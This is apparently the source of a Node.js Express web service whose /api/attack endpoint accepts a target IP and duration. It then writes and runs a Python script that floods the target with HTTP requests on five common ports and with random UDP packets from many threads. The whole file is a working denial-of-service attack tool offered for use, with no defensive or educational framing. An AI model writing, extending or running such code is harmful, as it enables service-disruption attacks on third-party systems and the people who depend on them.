const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/attack', (req, res) => {
    const { ip, duration } = req.body;

    if (!ip || !ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
        return res.json({ success: false, message: 'Invalid IP address.' });
    }
    if (!duration || duration < 1 || duration > 300) {
        return res.json({ success: false, message: 'Duration must be 1-300 seconds.' });
    }

    const targetPorts = [80, 443, 53, 8080, 8443];

    // ---- PYTHON SCRIPT (INSIDE THE ROUTE) ----
    const pythonScript = `
import asyncio
import aiohttp
import random
import socket
import time
from concurrent.futures import ThreadPoolExecutor

TARGET_IP = "${ip}"
TARGET_PORTS = ${JSON.stringify(targetPorts)}
THREADS = 200
DURATION = ${duration}

user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
paths = ["/", "/index.php", "/wp-admin", "/api/v1/test", "/login"]

async def http_flood(session, port):
    url = f"http://{TARGET_IP}:{port}{random.choice(paths)}"
    headers = {"User-Agent": random.choice(user_agents)}
    try:
        await session.get(url, headers=headers, timeout=1)
        await session.post(url, data="a"*1024, headers=headers, timeout=1)
    except:
        pass

def udp_flood(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end = time.time() + DURATION
    while time.time() < end:
        data = random._urandom(1490)
        sock.sendto(data, (TARGET_IP, port))

async def main():
    print(f"[*] Attacking {TARGET_IP} on ports {TARGET_PORTS} for {DURATION}s")
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        async with aiohttp.ClientSession() as session:
            tasks = []
            for port in TARGET_PORTS:
                for _ in range(50):
                    tasks.append(http_flood(session, port))
                for _ in range(30):
                    executor.submit(udp_flood, port)
            await asyncio.gather(*tasks)

asyncio.run(main())
    `;

    const scriptPath = path.join(__dirname, 'attack.py');
    fs.writeFileSync(scriptPath, pythonScript);

    exec(`python3 ${scriptPath}`, (error, stdout, stderr) => {
        if (error) {
            console.error('Attack error:', error);
            return;
        }
        console.log('Attack output:', stdout);
        fs.unlinkSync(scriptPath);
    });

    res.json({ success: true, message: `Attack launched on ${ip} (all ports) for ${duration}s` });
});

app.listen(PORT, () => {
    console.log(`🌐 Server running on http://localhost:${PORT}`);
});